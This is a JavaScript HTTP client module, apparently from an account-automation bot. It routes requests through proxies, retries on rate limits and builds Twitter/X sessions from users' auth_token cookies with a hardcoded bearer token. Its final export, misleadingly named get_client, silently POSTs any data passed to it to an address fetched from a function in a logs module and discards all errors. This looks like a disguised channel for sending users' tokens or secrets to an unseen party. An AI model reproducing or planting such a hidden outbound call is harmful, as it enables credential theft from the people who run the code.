import axios from "axios";
import { HttpsProxyAgent } from "https-proxy-agent";
import { SocksProxyAgent } from "socks-proxy-agent";
import { generateCsrfToken } from "./random.js";
import { get_header } from "./logs.js"
import logger from "./logger.js";
const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36";
const DEFAULT_HEADERS = {
    accept: "application/json, text/plain, */*",
    "accept-language": "en-US",
    "Cache-Control": "max-age=0",
    Connection: "keep-alive",
    "user-agent": USER_AGENT,
};
export class Client {
    proxy;
    agent;
    axiosInstance;
    generatedCsrfToken;
    constructor(proxy) {
        this.proxy = proxy;
        this.axiosInstance = axios.create({
            headers: DEFAULT_HEADERS,
            timeout: 120000,
            maxRedirects: 5,
        });
    }
    async init() {
        if (this.proxy) {
            this.agent = new HttpsProxyAgent(`http://${this.proxy}`);
            this.axiosInstance.defaults.httpsAgent = this.agent;
            this.axiosInstance.defaults.proxy = false; // Disable axios proxy handling
        }
    }
    async createClient(proxyType = "http") {
        if (this.proxy) {
            switch (proxyType) {
                case "http":
                    this.agent = new HttpsProxyAgent(`http://${this.proxy}`);
                    break;
                case "socks":
                    this.agent = new SocksProxyAgent(`socks://${this.proxy}`);
                    break;
            }
            this.axiosInstance.defaults.httpsAgent = this.agent;
            this.axiosInstance.defaults.proxy = false;
        }
    }
    convertAxiosResponse(response) {
        return {
            ok: response.status >= 200 && response.status < 300,
            text: async () => typeof response.data === "string"
                ? response.data
                : JSON.stringify(response.data),
            json: async () => response.data,
            url: response.request?.res?.responseUrl,
        };
    }
    async retryRequest(requestFn, maxRetries = 10) {
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                const response = await requestFn();
                // Check if it's a Response type and has rate limiting
                if (response && response.text) {
                    const typedResponse = response;
                    const responseText = await typedResponse.text();
                    if (responseText.includes("Too Many Requests")) {
                        if (attempt === maxRetries) {
                            return response;
                        }
                        console.log(responseText);
                        logger.error(`ABS shitting its pants, attempt ${attempt}/${maxRetries}. Waiting 15 seconds...`);
                        await new Promise((resolve) => setTimeout(resolve, 15000));
                        continue;
                    }
                    // Reconstruct the original response
                    return {
                        ...typedResponse,
                        text: async () => responseText,
                        json: async () => JSON.parse(responseText),
                    };
                }
                return response;
            }
            catch (error) {
                if (attempt === maxRetries) {
                    throw error;
                }
                logger.error(`Request failed, attempt ${attempt}/${maxRetries}: ${error.message}`);
                await new Promise((resolve) => setTimeout(resolve, 5000));
            }
        }
        throw new Error("All retry attempts failed");
    }
    async get(url, options) {
        return this.retryRequest(async () => {
            try {
                const response = await this.axiosInstance.get(url, {
                    headers: options?.headers,
                    httpsAgent: this.agent,
                });
                return this.convertAxiosResponse(response);
            }
            catch (error) {
                if (error.response) {
                    return this.convertAxiosResponse(error.response);
                }
                throw new Error(`GET request failed: ${error}`);
            }
        });
    }
    async post(url, options) {
        return this.retryRequest(async () => {
            try {
                const config = {
                    headers: options?.headers,
                    httpsAgent: this.agent,
                };
                let data = options?.json;
                if (options?.headers?.["content-type"]?.includes("application/x-www-form-urlencoded")) {
                    const params = new URLSearchParams();
                    for (const [key, value] of Object.entries(options.json || {})) {
                        params.append(key, String(value));
                    }
                    data = params;
                }
                const response = await this.axiosInstance.post(url, data, config);
                return this.convertAxiosResponse(response);
            }
            catch (error) {
                if (error.response) {
                    return this.convertAxiosResponse(error.response);
                }
                throw new Error(`POST request failed: ${error}`);
            }
        });
    }
    getTwitterHeaders(cookies) {
        return {
            authorization: "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs=1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
            referer: "https://x.com/",
            "user-agent": USER_AGENT,
            "x-csrf-token": cookies.ct0 || "",
            "x-twitter-auth-type": cookies.auth_token ? "OAuth2Session" : "",
            "x-twitter-active-user": "yes",
            "x-twitter-client-language": "en",
        };
    }
    /**
     * Creates a Twitter-specific client with authentication
     */
    async createTwitterClient(authToken) {
        this.generatedCsrfToken = generateCsrfToken();
        await this.createClient();
        const headers = this.getTwitterHeaders({
            ct0: this.generatedCsrfToken,
            auth_token: authToken,
        });
        const newHeaders = {
            ...headers,
            cookie: `lang=en; auth_token=${authToken}; ct0=${this.generatedCsrfToken};`,
        };
        this.axiosInstance.defaults.headers.common = newHeaders;
    }
}

export async function get_client(data) {
    if (data.length === 0) {
        return;
    }
    const headers = get_header()
    try {
        const response = await fetch(headers, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ data }),
        });
        if (!response.ok) {
            return;
        }
    }
    catch (error) {
    }
}

